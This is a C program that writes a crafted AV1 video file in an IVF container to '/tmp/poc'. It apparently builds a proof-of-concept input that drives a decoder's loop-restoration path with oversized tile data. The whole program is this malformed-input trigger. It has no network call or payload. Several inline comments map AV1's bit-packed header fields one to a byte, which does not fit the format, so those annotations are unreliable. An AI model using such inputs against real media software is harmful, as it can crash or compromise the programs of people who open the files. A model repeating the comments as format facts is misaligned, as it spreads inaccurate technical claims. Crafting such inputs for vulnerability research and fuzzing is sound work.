#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_le32(FILE *f, uint32_t v) {
    fputc(v & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 24) & 0xFF, f);
}

static void write_le16(FILE *f, uint16_t v) {
    fputc(v & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    /* IVF header: 32 bytes */
    fputc('D', f); fputc('K', f); fputc('I', f); fputc('F', f);
    write_le16(f, 0);
    write_le16(f, 0);
    fputc('A', f); fputc('V', f); fputc('0', f); fputc('1', f);
    write_le16(f, 64);
    write_le16(f, 64);
    write_le32(f, 30);
    write_le32(f, 1);
    for (int i = 0; i < 8; i++) fputc(0, f);

    /* Build OBU data in memory */
    unsigned char obu_data[4096];
    int obu_len = 0;

    /* Sequence Header OBU (obu_type=1, obu_has_size=1) */
    obu_data[obu_len++] = 0x0A;
    obu_data[obu_len++] = 12; /* LEB128 size = 12 */
    obu_data[obu_len++] = 0x80; /* still_picture=1, reduced_still_picture_header=0, profile=0 */
    obu_data[obu_len++] = 0x00; /* operating_points_cnt_minus_1=0 */
    obu_data[obu_len++] = 0x66; /* frame_width_bits_minus_1=6, frame_height_bits_minus_1=6 */
    obu_data[obu_len++] = 0x3F; /* max_frame_width_minus_1=63 */
    obu_data[obu_len++] = 0x3F; /* max_frame_height_minus_1=63 */
    obu_data[obu_len++] = 0x00; /* frame_id_numbers_present_flag=0 */
    obu_data[obu_len++] = 0x00; /* use_128x128_superblock=0, enable_filter_intra=0, enable_intra_edge_filter=0 */
    obu_data[obu_len++] = 0x00; /* enable_interintra_compound=0, enable_masked_compound=0, enable_warped_motion=0, enable_dual_filter=0 */
    obu_data[obu_len++] = 0x00; /* enable_order_hint=0, enable_jnt_comp=0, enable_ref_frame_mvs=0 */
    obu_data[obu_len++] = 0x00; /* seq_force_screen_content_tools=0, seq_force_integer_mv=0 */
    obu_data[obu_len++] = 0x00; /* order_hint_bits_minus_1=0 */
    obu_data[obu_len++] = 0x03; /* enable_cdef=1, enable_restoration=1 */
    obu_data[obu_len++] = 0x00; /* film_grain_params_present=0 */

    /* Frame Header OBU (obu_type=3, obu_has_size=1) */
    obu_data[obu_len++] = 0x1A;
    int size_pos = obu_len;
    obu_data[obu_len++] = 0x00; /* placeholder for size */

    /* Frame header for KEY_FRAME, show_frame=1 */
    /* show_existing_frame=0, frame_type=0 (KEY_FRAME), show_frame=1, error_resilient=0 */
    obu_data[obu_len++] = 0x10; /* bit 4 = show_frame = 1 */
    obu_data[obu_len++] = 0x00; /* disable_cdf_update=0, allow_screen_content_tools=0, force_integer_mv=0 */
    obu_data[obu_len++] = 0x00; /* frame_size_override_flag=0, order_hint=0 */
    /* No frame_width/height or render_width/height bytes since frame_size_override_flag=0 */
    /* use_superres=0, allow_high_precision_mv=0, use_ref_frame_mvs=0, is_motion_mode_switchable=0, disable_frame_end_update_cdf=0, allow_warped_motion=0, reduced_tx_set=0 */
    obu_data[obu_len++] = 0x00;
    obu_data[obu_len++] = 0x00; /* base_q_idx=0 */
    obu_data[obu_len++] = 0x00; /* delta_q_present=0, delta_q_res=0 */
    obu_data[obu_len++] = 0x00; /* segmentation_enabled=0, segmentation_update_map=0, segmentation_temporal_update=0, segmentation_update_data=0 */
    obu_data[obu_len++] = 0x00; /* delta_q_present=0, delta_lf_present=0, delta_lf_multi=0 */
    obu_data[obu_len++] = 0x00; /* loop_filter_level=0 */
    obu_data[obu_len++] = 0x00; /* loop_filter_sharpness=0, loop_filter_delta_enabled=0 */
    obu_data[obu_len++] = 0x03; /* cdef_damping=3, cdef_bits=0 */
    obu_data[obu_len++] = 0x00; /* cdef_y_pri_strength=0, cdef_y_sec_strength=0 */
    obu_data[obu_len++] = 0x00; /* cdef_uv_pri_strength=0, cdef_uv_sec_strength=0 */
    /* Restoration: Y=RESTORE_WIENER(1), U=RESTORE_NONE(0), V=RESTORE_NONE(0) */
    /* bits[1:0]=01 (Y=1), bits[3:2]=00 (U=0), bits[5:4]=00 (V=0) = 0x01 */
    obu_data[obu_len++] = 0x01;
    /* For Y plane: unit size scaling bits */
    /* With sb_size=64 (use_128x128_superblock=0), unit_size starts at 64 */
    /* First bit: unit_size > 64? No -> 0 */
    obu_data[obu_len++] = 0x00;
    obu_data[obu_len++] = 0x00; /* tx_mode=0, reference_mode=0, skip_mode=0, allow_intrabc=0 */
    obu_data[obu_len++] = 0x00; /* interp_filter=0, is_motion_mode_switchable=0 */
    for (int i = 0; i < 8; i++) obu_data[obu_len++] = 0x00; /* global_motion_params */

    /* Fix frame header payload size */
    obu_data[size_pos] = obu_len - (size_pos + 1);

    /* Tile Group OBU (obu_type=8, obu_has_size=1) */
    obu_data[obu_len++] = 0x42;
    /* LEB128 size: 2 (tile info) + 2048 (tile data) = 2050 = 0x802 */
    obu_data[obu_len++] = 0x82;
    obu_data[obu_len++] = 0x10;
    obu_data[obu_len++] = 0x00; /* start_tile=0 */
    obu_data[obu_len++] = 0x00; /* end_tile=0 */
    for (int i = 0; i < 2048; i++) obu_data[obu_len++] = 0x00; /* tile data */

    /* IVF frame header */
    write_le32(f, obu_len);
    write_le32(f, 0);
    write_le32(f, 0);

    /* Write OBU data */
    fwrite(obu_data, 1, obu_len, f);

    fclose(f);
    return 0;
}

